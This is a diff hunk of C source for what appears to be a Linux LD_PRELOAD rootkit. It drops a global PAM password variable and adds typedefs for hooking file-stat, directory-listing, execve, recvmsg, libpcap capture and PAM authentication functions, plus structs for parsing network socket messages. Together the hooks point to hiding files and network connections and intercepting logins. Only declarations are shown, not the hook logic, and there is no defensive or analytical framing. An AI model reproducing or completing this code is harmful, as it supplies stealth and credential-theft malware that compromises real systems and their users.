@@ -11,9 +11,41 @@
 #include <sys/socket.h>
 #include <sys/stat.h>
 
-char *pampassword;
-
 #define LD_HOOK __attribute__((visibility("default")))
+
+typedef int (*fstatat_fn)(int, const char *, struct stat *, int);
+typedef int (*pam_acct_mgmt_fn)(pam_handle_t *, int);
+typedef int (*pam_authenticate_fn)(pam_handle_t *, int);
+typedef int (*execve_fn)(const char *, char *const[], char *const[]);
+typedef FILE* (*fopen64_fn)(const char *, const char *);
+typedef int (*stat_fn)(const char *restrict, struct stat *restrict);
+typedef ssize_t (*read_fn)(int, void *, size_t);
+typedef int (*pcap_stats_fn)(pcap_t *, struct pcap_stat *);
+typedef FILE *(*fopen_fn)(const char *restrict, const char *restrict);
+typedef ssize_t (*recvmsg_fn)(int, struct msghdr *, int);
+typedef int (*pam_set_item_fn)(pam_handle_t *, int, const void *);
+typedef int (*statx_fn)(int, const char *, int,
+                          unsigned int, struct statx *);
+typedef int (*fstatat64_fn)(int, const char *, struct stat64 *, int);
+typedef int (*pcap_loop_fn)(pcap_t *, int, pcap_handler, u_char *);
+typedef struct dirent *(*readdir_fn)(DIR *);
+typedef struct dirent64 *(*readdir64_fn)(DIR *);
+
+struct net_data {
+    unsigned char sa_family;
+    char pad1[3];
+    uint16_t port1;
+    uint16_t port2;
+    uint32_t ip1;
+    char pad2[12];
+    uint32_t ip2;
+  };
+  struct protocol_struct {
+    uint32_t len;
+    uint16_t unk1;
+    char pad1[10];
+    struct net_data ndata;
+  };
 
 LD_HOOK int fstatat (int fd, const char *restrict path,
                      struct stat *restrict buf, int flag);
